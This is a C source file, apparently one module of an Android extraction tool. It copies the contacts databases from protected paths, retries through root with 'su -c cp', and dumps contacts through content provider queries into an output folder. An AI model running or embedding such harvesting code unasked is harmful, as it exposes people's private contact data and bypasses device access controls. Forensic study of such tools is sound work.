// engine_02_contacts.c - Contacts database extraction
#include "common.h"
static int write_file_with_name(const char *dir, const char *name, const char *content) {
    char p[MAX_PATH]; snprintf(p, sizeof(p), "%s/%s", dir, name); return write_file(p, content);
}
static int try_db_dump(const char *outdir, const char *label, const char *src) {
    char dst[MAX_PATH], cmd[MAX_PATH * 2], buf[65536];
    snprintf(dst, sizeof(dst), "%s/%s.db", outdir, label);
    save_with_root_fallback(src, dst);
    if (file_exists(dst) && file_size(dst) > 100) {
        // Try to dump tables using local sqlite parsing or adb
        snprintf(cmd, sizeof(cmd), "sqlite3 %s .tables 2>/dev/null || strings %s | head -200 || true", dst, dst);
        run_cmd(cmd, buf, sizeof(buf));
        char tb[512]; snprintf(tb, sizeof(tb), "%s/%s_tables.txt", outdir, label); write_file(tb, buf);
        return 1;
    }
    // Try root copy
    snprintf(cmd, sizeof(cmd), "su -c 'cp %s %s' 2>/dev/null || true", src, dst);
    run_cmd(cmd, buf, 10);
    return (file_exists(dst) && file_size(dst) > 100) ? 1 : 0;
}
int main(int argc, char **argv) {
    const char *outdir = argc > 1 ? argv[1] : ".";
    char res[MAX_PATH], jsonname[MAX_PATH];
    snprintf(res, sizeof(res), "%s/contacts", outdir); mkdir_p(res);
    snprintf(jsonname, sizeof(jsonname), "%s/.engine_02.json", outdir); json_start(jsonname);
    int count = 0; char buf[65536];
    const char *paths[] = {
        "/data/data/com.android.providers.contacts/databases/contacts2.db",
        "/data/data/com.android.providers.contacts/databases/profile.db",
        "/data/data/com.android.providers.contacts/databases/contacts.db",
        "/storage/emulated/0/Android/data/com.android.providers.contacts/*.db",
        NULL
    };
    for (int i = 0; paths[i]; i++) {
        if (try_db_dump(res, "contacts", paths[i])) count++;
    }
    // Content provider dump
    run_cmd("content query --uri content://com.android.contacts/data 2>/dev/null | head -5000 || true", buf, sizeof(buf));
    if (strlen(buf) > 10) { write_file_with_name(res, "content_provider_dump.txt", buf); count++; }
    run_cmd("content query --uri content://com.android.contacts/raw_contacts 2>/dev/null | head -2000 || true", buf, sizeof(buf));
    if (strlen(buf) > 10) { write_file_with_name(res, "raw_contacts.txt", buf); count++; }
    // vCard export attempt
    run_cmd("content query --uri content://com.android.contacts/contacts/export 2>/dev/null | head -5000 || true", buf, sizeof(buf));
    if (strlen(buf) > 10) { write_file_with_name(res, "vcard_export.vcf", buf); count++; }
    json_ki("files_extracted", count); json_end();
    printf("{\"engine\":\"contacts\",\"status\":\"ok\",\"files\":%d}\n", count);
    return 0;
}
